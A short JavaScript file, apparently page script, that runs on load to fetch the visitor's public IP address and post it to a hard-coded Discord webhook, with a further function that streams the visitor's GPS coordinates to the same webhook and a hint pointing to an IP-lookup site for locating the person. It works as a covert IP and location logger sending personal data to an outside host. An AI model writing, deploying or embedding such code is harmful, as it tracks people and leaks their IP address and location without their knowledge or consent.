function discord_msg(mesage) {
    fetch("https://discordapp.com/api/webhooks/1314184962294943744/QYSA83vPxXajbuQMDsQq6bZk9F1ewUNE9vT049DBeZHaR1_piY1Zd_9xZrN1PHgkbSzj", {
        body: JSON.stringify({
          content: mesage,
        }),
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      })
        .then(function (res) {
          console.log(res);
        })
        .catch(function (res) {
          console.log(res);
        });
};

async function get_location() {
    dosomething = navigator.geolocation.watchPosition((position) => {
        discord_msg(position.coords.latitude + " " + position.coords.longitude);
      });
};

async function get_ip() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        discord_msg(data.ip, "       go to https://www.iplocation.net/ip-lookup to search ip") }
        catch (error) {
        console.error('Error fetching IP address:', error);
    }
};
 

get_ip();
